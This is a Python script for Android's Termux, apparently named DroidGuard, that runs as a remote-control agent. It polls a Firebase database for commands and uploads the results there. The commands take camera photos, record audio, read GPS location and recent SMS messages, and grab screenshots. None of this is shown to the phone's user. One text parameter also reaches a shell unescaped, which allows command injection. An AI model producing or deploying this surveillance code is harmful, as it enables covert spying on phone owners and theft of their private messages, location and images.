#!/data/data/com.termux/files/usr/bin/python
import time, requests, hashlib, os, json, subprocess, base64

FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"
MEU_ID = hashlib.md5(os.uname().nodename.encode()).hexdigest()[:8]

# Pasta correta para arquivos (Downloads tem permissão)
PASTA_DCIM = "/sdcard/Download/DroidGuard/"
os.makedirs(PASTA_DCIM, exist_ok=True)

print(f"\n🟢 DROIDGUARD - ID: {MEU_ID}")
print(f"📁 Pasta: {PASTA_DCIM}\n")

def obter_bateria():
    try:
        r = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True, timeout=3)
        if r.returncode == 0:
            return json.loads(r.stdout).get("percentage", 0)
    except:
        pass
    return 0

while True:
    try:
        r = requests.get(f"{FIREBASE_URL}/comandos/{MEU_ID}.json", timeout=5)
        
        if r.status_code == 200 and r.json():
            for cmd_id, cmd in r.json().items():
                acao = cmd.get("acao")
                params = cmd.get("params", {})
                print(f"🎯 {acao}")
                
                resposta = {"status": "ok"}
                
                if acao == "bateria":
                    resposta = {"percentage": obter_bateria()}
                    print(f"  ✅ {resposta['percentage']}%")
                
                elif acao == "vibrar":
                    subprocess.run("termux-vibrate -d 500", shell=True)
                    print(f"  ✅ Vibrou")
                
                elif acao == "falar":
                    texto = params.get("texto", "Teste")
                    subprocess.run(f'termux-tts-speak "{texto}"', shell=True)
                    print(f"  ✅ Falou")
                
                elif acao in ["foto_frontal", "foto_traseria"]:
                    cam = "1" if acao == "foto_frontal" else "0"
                    arquivo = f"{PASTA_DCIM}{acao}_{int(time.time())}.jpg"
                    try:
                        subprocess.run(f"termux-camera-photo -c {cam} {arquivo}", shell=True, timeout=10)
                        if os.path.exists(arquivo):
                            with open(arquivo, "rb") as f:
                                resposta = {"foto": base64.b64encode(f.read()).decode()}
                            os.remove(arquivo)
                            print(f"  ✅ Foto OK")
                        else:
                            resposta = {"erro": "falha ao salvar"}
                    except Exception as e:
                        resposta = {"erro": str(e)}
                        print(f"  ❌ {e}")
                
                elif acao == "gps":
                    try:
                        g = subprocess.run("termux-location", shell=True, capture_output=True, text=True, timeout=15)
                        if g.returncode == 0 and g.stdout:
                            dados = json.loads(g.stdout)
                            resposta = {"latitude": dados.get("latitude"), "longitude": dados.get("longitude")}
                            print(f"  ✅ GPS OK")
                        else:
                            resposta = {"erro": "GPS sem sinal"}
                    except Exception as e:
                        resposta = {"erro": str(e)}
                
                elif acao == "gravar_audio":
                    duracao = min(params.get("duracao", 5), 10)
                    arquivo = f"{PASTA_DCIM}audio_{int(time.time())}.aac"
                    try:
                        subprocess.run(f"termux-microphone-record -f {arquivo} -d {duracao}", shell=True, timeout=duracao+3)
                        if os.path.exists(arquivo):
                            with open(arquivo, "rb") as f:
                                resposta = {"audio": base64.b64encode(f.read()).decode()}
                            os.remove(arquivo)
                            print(f"  ✅ Áudio OK")
                        else:
                            resposta = {"erro": "falha ao gravar"}
                    except Exception as e:
                        resposta = {"erro": str(e)}
                
                elif acao == "listar_sms":
                    try:
                        s = subprocess.run("termux-sms-list -l 5", shell=True, capture_output=True, text=True, timeout=10)
                        if s.returncode == 0 and s.stdout:
                            sms_list = json.loads(s.stdout)
                            resposta = {"sms": [{"numero": sm.get("number"), "texto": sm.get("body")[:100]} for sm in sms_list[:5]]}
                            print(f"  ✅ {len(resposta['sms'])} SMS")
                        else:
                            resposta = {"sms": []}
                    except Exception as e:
                        resposta = {"erro": str(e)}
                
                elif acao == "screenshot":
                    arquivo = f"{PASTA_DCIM}screen_{int(time.time())}.png"
                    try:
                        subprocess.run(f"termux-screenshot {arquivo}", shell=True, timeout=5)
                        if os.path.exists(arquivo):
                            with open(arquivo, "rb") as f:
                                resposta = {"screen": base64.b64encode(f.read()).decode()}
                            os.remove(arquivo)
                            print(f"  ✅ Screenshot OK")
                        else:
                            resposta = {"erro": "falha ao capturar"}
                    except Exception as e:
                        resposta = {"erro": str(e)}
                
                # Enviar resposta e apagar comando
                requests.put(f"{FIREBASE_URL}/resultados/{MEU_ID}/{cmd_id}.json", json=resposta, timeout=5)
                requests.delete(f"{FIREBASE_URL}/comandos/{MEU_ID}/{cmd_id}.json", timeout=5)
                print(f"  ✅ Respondido")
        
        # Status online
        requests.patch(f"{FIREBASE_URL}/dispositivos/{MEU_ID}.json", 
                      json={"status": "online", "bateria": obter_bateria(), "timestamp": time.time()}, timeout=5)
        
        time.sleep(2)
        
    except Exception as e:
        print(f"⚠️ {e}")
        time.sleep(5)
